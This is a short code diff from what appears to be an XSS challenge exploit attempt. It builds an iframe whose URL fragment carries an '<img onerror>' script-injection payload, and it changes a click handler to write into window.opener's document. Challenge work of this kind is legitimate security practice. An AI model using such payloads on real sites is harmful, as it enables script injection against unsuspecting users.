@@ -7,9 +7,12 @@
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
     iframe.onclick = function(e){
-//       window.history.back();
-//       window.open(this.contentWindow.name, this.src);
-      alert(document.domain)
+      if(window.opener){
+          window.opener.document.write('1')
+      }
+      else{
+          alert('2')
+      }
     }
     document.body.appendChild(iframe);
   </script>
